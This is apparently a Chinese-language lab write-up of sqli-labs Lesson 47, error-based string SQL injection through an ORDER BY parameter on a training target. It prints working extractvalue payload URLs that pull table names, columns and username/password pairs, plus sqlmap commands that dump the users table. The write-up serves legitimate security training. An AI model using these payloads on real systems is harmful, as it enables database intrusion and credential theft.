---
title: sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入
date: 2018-11-05 21:10:11
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-47/001.png)

## 分析

desc或者asc判断闭合类型,发现为字符型。尝试单引号闭合成功。

## 报错注入

`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,database(),0x7e))%23`

![002](/img/sql/Lesson-47/002.png)

`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`

![003](/img/sql/Lesson-47/003.png)

`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`

![004](/img/sql/Lesson-47/004.png)

`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password)from(security.users)limit 0,1),0x7e))%23`

![005](/img/sql/Lesson-47/005.png)



## SQLMAP

`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 --level 2 --risk 2`

![006](/img/sql/Lesson-47/006.png)

![007](/img/sql/Lesson-47/007.png)

`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 -D security -T users --columns --dump`

直接上结果

![008](/img/sql/Lesson-47/008.png)